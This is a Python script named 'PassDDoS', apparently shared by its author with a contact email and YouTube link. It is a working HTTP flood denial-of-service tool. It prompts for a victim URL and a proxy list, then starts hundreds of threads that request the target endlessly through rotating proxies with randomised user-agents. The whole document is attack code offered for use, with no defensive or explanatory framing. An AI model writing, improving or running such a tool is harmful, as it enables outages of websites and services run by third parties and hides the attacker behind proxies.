#-- coding: utf8 --
#!/usr/bin/env python3

#-------------------------------#
# Contact: andanh3705@gmail.com #
# YouTube: bit.ly/PassDDoS      #
#-------------------------------#

import urllib.request, os, threading, time, random, sys
	
useragents = [
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",]	
	
class Spammer(threading.Thread):
    
    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = { 'User-Agent' : random.choice(useragents) }
        self.Lock = threading.Lock()
        self.proxy = proxy

    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        sys.stdout.write("[+] HTTP Flood | Packet => [%s]\n"%(self.url))
            
    def run(self):
        global Close, Request, Tot_req
        self.Lock.acquire()
        print ('[!] Starting thread {0}'.format(self.num))
        self.Lock.release()
        time.sleep(1)
        while True:
            try:
                self.request()
            except:
                sys.stdout.write("[X] Connection Proxy Lost...exiting\n")
                sys.exit(0)
        sys.exit(0)

class MainLoop():

    def home(self):
        global Close, Request, Tot_req
        print \
("""                  ____               ____  ____       ____
                 |  _ \ __ _ ___ ___|  _ \|  _ \  ___/ ___|
                 | |_) / _` / __/ __| | | | | | |/ _ \___ \ 
                 |  __/ (_| \__ \__ \ |_| | |_| | (_) |__) |
                 |_|   \__,_|___/___/____/|____/ \___/____/
""")
        while True:        
            url = input('[*] Target [http://victim.com]: ')
            try:
                req = urllib.request.Request(url, None, {'User-Agent' : random.choice(useragents)})
                response = urllib.request.urlopen(req)
                break
            except:
                break
        try:
            lista = str(input('[*] Proxy: '))
            in_file = open(lista,"r")
        except:
            print ('[X] Error to read file.')
        try:
            num_threads = int(input('[*] Thread [800]: '))
        except:
            num_threads = num_threads 

        for i in range(num_threads):
            in_line = in_file.readline()
            Spammer(url, i + 1, in_line).start()
            in_line = in_line[:-1]
        
if __name__ == '__main__':
    MainLoop().home()